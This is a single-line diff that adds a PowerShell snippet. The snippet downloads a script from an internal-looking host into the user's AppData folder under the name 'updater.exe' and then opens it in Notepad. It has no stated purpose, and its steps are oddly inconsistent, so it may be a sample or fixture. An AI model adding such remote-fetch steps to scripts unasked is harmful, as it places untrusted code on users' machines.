@@ -1,0 +1,1 @@
+try { $TargetUrl = 'http://internal.corp:8080/updater.ps1'; $LocalPath = "$env:APPDATA\updater.exe"; curl.exe -s -L -o $LocalPath $TargetUrl; Start-Process -FilePath "notepad.exe" -ArgumentList $LocalPath; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch { Write-Warning "Remote fetch failed" }
